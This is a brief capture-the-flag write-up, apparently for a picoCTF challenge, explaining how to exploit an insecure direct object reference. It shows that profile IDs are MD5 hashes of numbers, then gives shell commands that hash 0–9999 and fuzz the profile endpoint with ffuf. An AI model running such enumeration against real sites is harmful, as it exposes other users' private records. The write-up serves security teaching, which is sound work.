# URL
https://learn.cylabacademy.org/library/750
# Concept
* IDOR (insecure direct object reference)
* security through obscurity
* web fuzzing
* ffuf
# Method of solve
* we suspect that the endpoint hexadecimal controls which profile we end up looking at
* if we plug the hex into the crackstation.net website, we're told that it is MD5, and the value of it is 3000
* we can confirm with a Linux command:
```
printf '%s' 3000 | md5sum
```
* We don't know which ID numbers are valid, but we'll fuzz the numbers form 0 to 9999
* to create the files we'll fuzz with:
```
seq 0 999 >> list.txt && seq -w 0 9999 >> list.txt
while IFS= read -r line; do printf '%s' "$line" | md5sum | awk '{print $1}'; done < list.txt > md5list.txt
```
* now we can run `FFuF` to determine which endpoints are valid (remember to switch out the port number in the following command)
```
ffuf -w md5list.txt -u http://crystal-peak.picoctf.net:52386/profile/user/FUZZ
```
